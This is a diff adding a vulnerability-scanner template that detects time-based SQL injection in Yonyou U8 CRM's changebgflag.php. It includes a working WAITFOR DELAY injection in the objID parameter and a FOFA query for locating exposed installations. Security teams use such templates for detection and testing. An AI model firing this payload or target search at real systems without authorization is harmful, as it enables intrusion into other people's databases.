@@ -1,0 +1,53 @@
+id: poc-yaml-yongyon-u8-crm-changebgflag-php-sqli
+info:
+  name: 用友U8 CRM changebgflag.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: "用友U8+CRM"
+    fofa: "body=\"用友U8CRM\""
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/login/login.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "用友U8CRM"
+        part: body
+
+  - id: sqli-check
+    method: GET
+    path:
+      - "{{BaseURL}}/service/changebgflag.php?UserSessionID=bgsesstimeout-&objType=1&StopBgFlag=1&objID=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "PHPSESSID=bgsesstimeout-"
+        part: header
+      - type: word
+        negative: true
+        words:
+          - "<html"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
